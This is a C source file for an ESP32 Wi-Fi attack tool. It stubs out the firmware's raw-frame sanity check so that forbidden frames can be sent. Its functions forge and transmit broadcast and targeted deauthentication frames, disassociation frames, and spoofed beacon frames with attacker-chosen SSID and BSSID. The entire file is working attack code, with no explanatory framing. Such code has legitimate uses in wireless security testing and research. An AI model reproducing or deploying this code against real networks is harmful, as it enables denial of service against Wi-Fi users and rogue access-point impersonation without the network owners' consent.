/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Raw frame TX failed! Error: %s", esp_err_to_name(err));
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

/**
 * @brief Sends a forged beacon frame with a custom SSID, BSSID, and channel.
 *
 * @param bssid Pointer to 6-byte BSSID array
 * @param ssid Pointer to SSID bytes
 * @param ssid_length Length of SSID
 * @param channel Wi-Fi channel to advertise on
 */
void wsl_bypasser_send_beacon_frame(uint8_t *bssid, uint8_t *ssid, uint8_t ssid_length, uint8_t channel) {
    ESP_LOGD(TAG, "Sending beacon frame...");

    // Beacon frame buffer
    uint8_t beacon_frame[128] = {
        0x80, 0x00,                         // Frame Control (Beacon)
        0x00, 0x00,                         // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (broadcast)
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source MAC placeholder
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID placeholder
        0x00, 0x00,                         // Sequence control

        // Timestamp
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,

        0x64, 0x00,                         // Beacon interval
        0x01, 0x04,                         // Capability info

        // SSID tag
        0x00,                               // SSID tag number
        0x00                                // SSID length (to be filled later)
        // SSID data will follow
    };

    // Insert BSSID and source MAC
    memcpy(&beacon_frame[10], bssid, 6);
    memcpy(&beacon_frame[16], bssid, 6);

    // Insert SSID
    beacon_frame[37] = ssid_length;
    memcpy(&beacon_frame[38], ssid, ssid_length);

    // Length so far
    uint16_t frame_length = 38 + ssid_length;

    // Add channel info
    beacon_frame[frame_length++] = 0x03; // DS Parameter Set tag
    beacon_frame[frame_length++] = 0x01; // Length
    beacon_frame[frame_length++] = channel;

    // Send using STA mode
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_length, false);
}



void wsl_bypasser_send_deauth_targeted(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t deauth_frame[26];
    memcpy(deauth_frame, deauth_frame_default, 26);

    memcpy(&deauth_frame[4], client_mac, 6);

    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, 26);
}

void wsl_bypasser_send_disassociation_frame(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t disas_frame[] = {
        0xa0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest (4-9)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (10-15)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (16-21)
        0xf0, 0xff, 0x01, 0x00              // Reason code 1
    };

    memcpy(&disas_frame[4], client_mac, 6);
    memcpy(&disas_frame[10], ap_bssid, 6);
    memcpy(&disas_frame[16], ap_bssid, 6);

    wsl_bypasser_send_raw_frame(disas_frame, sizeof(disas_frame));
}
